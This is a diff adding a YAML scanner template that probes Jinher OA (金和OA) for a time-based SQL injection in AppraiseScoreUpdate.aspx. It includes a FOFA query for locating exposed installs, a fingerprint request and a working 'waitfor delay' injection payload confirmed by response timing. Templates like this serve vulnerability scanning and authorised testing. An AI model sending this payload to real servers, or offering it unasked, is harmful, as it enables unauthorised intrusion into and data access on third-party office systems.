@@ -1,0 +1,31 @@
+id: poc-yaml-jinher-appraisescoreupdate-aspx-sqli
+info:
+  name: 金和OA AppraiseScoreUpdate.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
+  expression: status_code == 200 && contains(body,"JHSoft")
+- method: GET
+  path: /c6/Jhsoft.Web.Appraise/AppraiseScoreUpdate.aspx/?id=1'waitfor+delay'0:0:{{.t1}}'--
+  expression: 'status_code == 200 &&
+
+    contains(gbk_decode(body),"修改考核总分") &&
+
+    contains(gbk_decode(body),"考核得分") &&
+
+    contains(gbk_decode(body),"更改后系统会提醒被考核人") &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
